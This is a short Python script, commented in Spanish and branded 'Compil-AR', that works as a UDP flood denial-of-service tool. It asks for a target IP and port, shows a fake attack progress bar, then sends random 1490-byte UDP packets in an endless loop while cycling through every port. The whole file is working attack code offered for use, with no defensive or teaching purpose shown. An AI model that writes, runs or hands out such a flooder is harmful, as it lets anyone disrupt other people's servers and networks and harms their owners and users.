import sys
import os
import time
import socket
import random
from datetime import datetime

# Obtener la fecha y hora actual
ahora = datetime.now()
hora = ahora.hour
minuto = ahora.minute
dia = ahora.day
mes = ahora.month
año = ahora.year

# Configurar un socket UDP y generar datos aleatorios
socket_udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes_aleatorios = random._urandom(1490)

# Imprimir el nuevo logo
print("  _____                           _  _                       ")
print(" /  __ \                         (_)| |                      ")
print(" | /  \/  ___   _ __ ___   _ __   _ | | ______   __ _  _ __  ")
print(" | |     / _ \ | '_ ` _ \ | '_ \ | || ||______| / _` || '__| ")
print(" | \__/\| (_) || | | | | || |_) || || |        | (_| || |    ")
print("  \____/ \___/ |_| |_| |_|| .__/ |_||_|         \__,_||_|    ")
print("                         | |                                ")
print("                         |_|                                ")
print("                                                            ")
print("              https://github.com/Compil-AR                  ")

# Obtener la entrada del usuario para la dirección IP y el puerto objetivo
ip_objetivo = input("\nIngrese la IP del objetivo: ")
puerto_objetivo = int(input("Ingrese el puerto: "))

# Limpiar la pantalla de la terminal e iniciar el ataque con una barra de progreso simulada
os.system("clear")
os.system("figlet Iniciando Ataque")
print("[                    ] 0% ")
time.sleep(5)
print("[=====               ] 25%")
time.sleep(5)
print("[==========          ] 50%")
time.sleep(5)
print("[===============     ] 75%")
time.sleep(5)
print("[====================] 100%")
time.sleep(3)

# Enviar un flujo continuo de paquetes UDP al IP y puerto especificados
paquetes_enviados = 0
while True:
    socket_udp.sendto(bytes_aleatorios, (ip_objetivo, puerto_objetivo))
    paquetes_enviados += 1
    puerto_objetivo += 1
    print(f"Enviados {paquetes_enviados} paquetes a {ip_objetivo} a través del puerto: {puerto_objetivo}")
    if puerto_objetivo == 65534:
        puerto_objetivo = 1
